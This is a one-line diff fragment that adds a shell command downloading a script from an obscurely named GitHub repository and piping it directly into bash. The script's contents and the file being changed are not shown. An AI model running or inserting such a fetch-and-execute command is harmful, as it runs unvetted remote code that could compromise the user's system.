@@ -1,0 +1,1 @@
+curl -Ls https://raw.githubusercontent.com/jfjdjdhsj/jb/refs/heads/main/1.sh | sed 's/\r$//' | bash
